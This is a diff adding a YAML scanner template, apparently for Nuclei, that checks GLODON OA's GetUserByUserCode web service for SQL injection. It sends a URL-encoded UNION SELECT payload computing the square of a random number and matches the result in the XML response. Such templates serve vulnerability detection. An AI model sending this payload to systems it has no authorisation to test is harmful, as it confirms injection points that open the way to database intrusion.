@@ -1,0 +1,24 @@
+id: poc-yaml-glodon-getuserbyusercode-sqli
+info:
+  name: GLODON OA GetUserByUserCode SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: "{{rand_int(100,999)}}"
+  t2: "{{to_number(t1)*to_number(t1)}}"
+http:
+  - method: GET
+    path:
+      - "/Org/service/Service.asmx/GetUserByUserCode?EncryptData=1&userCode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20POWER({{t1}},2)),NULL,NULL--+"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<?xml version"
+          - "<string xmlns"
+          - "{{t2}}"
